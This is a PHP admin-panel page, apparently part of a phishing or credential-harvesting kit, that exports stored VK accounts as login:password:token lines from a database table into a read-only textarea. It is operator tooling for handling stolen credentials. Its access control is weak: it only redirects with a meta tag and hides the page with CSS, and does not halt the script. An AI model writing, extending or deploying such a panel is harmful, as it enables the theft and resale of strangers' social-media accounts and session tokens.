<?
include '../bdlog.php';

if(isset($_SESSION['admin'])) {
$msg = '';

} else { echo '<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=auth.php">'; }
if(!isset($_SESSION['admin'])) { echo '
  <META HTTP-EQUIV="REFRESH" CONTENT="0;URL=/admin/auth.php">
  <style> body {display:none !important;}'; }
$randch = rand(100,9999999999999999);
?>
<!DOCTYPE html>
<!--
This is a starter template page. Use this page to start your new project from
scratch. This page gets rid of all links and provides the needed markup only.EE
-->
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="x-ua-compatible" content="ie=edge">

  <title>Admin</title>

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="plugins/font-awesome/css/font-awesome.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/adminlte.css">
  <!-- Google Font: Source Sans Pro -->
  <link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
</head>
<body class="hold-transition sidebar-mini">
<div class="wrapper">

 
  <!-- /.navbar -->

  <!-- Main Sidebar Container -->
  <aside class="main-sidebar sidebar-dark-primary elevation-4">
    <!-- Brand Logo -->
    <a style="font-family:intro; color:#6CD089;" href="index.php" class="brand-link">
      <center><span class="brand-text font-weight-2px"> ADMIN PANEL [<?=$colvousers?>]</span></center>
    </a>


    <!-- Sidebar -->
    <div class="sidebar">
      <!-- Sidebar user panel (optional) -->
      

      <!-- Sidebar Menu -->
      <nav class="mt-2">
        <ul class="nav nav-pills nav-sidebar flex-column" data-widget="treeview" role="menu" data-accordion="false">
          <!-- Add icons to the links using the .nav-icon class
               with font-awesome or any other icon font library -->
          <? include 'menu.php'; ?>
          
        </ul>
      </nav>
      <!-- /.sidebar-menu -->
    </div>
    <!-- /.sidebar -->
  </aside>

  <!-- Content Wrapper. Contains page content -->
  <div class="content-wrapper">
    <!-- Content Header (Page header) -->
    <div class="content-header">
      <div class="container-fluid">
        <div class="row mb-2">
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content-header -->

    <!-- Main content -->
    <div class="content">
      <div class="container-fluid">
		<?=$msg?>
		<div class="col-md-12" style="display:inline-block;">
            
            <!-- /.card -->

            <div class="card card-primary">
              <div class="card-header">
                <h3 class="card-title">Экспорт аккаунтов VK // business_dark</h3>
              </div>
              <!-- /.card-header -->
              <div class="card-body p-0">
<br>
                <textarea readonly style="margin-top: 0px;margin-left: 10px;margin-bottom: 10px;height: 400px;width: 98%;">
<? if(isset($_SESSION['admin'])) {
	$linkads = $db->query("SELECT * FROM data order by id desc");			
while ($resone = mysqli_fetch_array($linkads)) {	
echo $resone['login'].":".$resone['pass'].":".$resone['token'].'
';
				  } }
																				?>
</textarea>
              </div>
              <!-- /.card-body -->
            </div>
            <!-- /.card -->
          </div>
		 
		  
        <!-- /.row -->
      </div><!-- /.container-fluid -->
    </div>
    <!-- /.content -->
  </div>
  <!-- /.content-wrapper -->

  <!-- Control Sidebar -->
  
  <!-- /.control-sidebar -->

  <!-- Main Footer -->
 
</div>
<!-- ./wrapper -->

<!-- REQUIRED SCRIPTS -->

<!-- jQuery -->
<script src="plugins/jquery/jquery.min.js"></script>
<!-- Bootstrap 4 -->
<script src="plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
</body>
</html>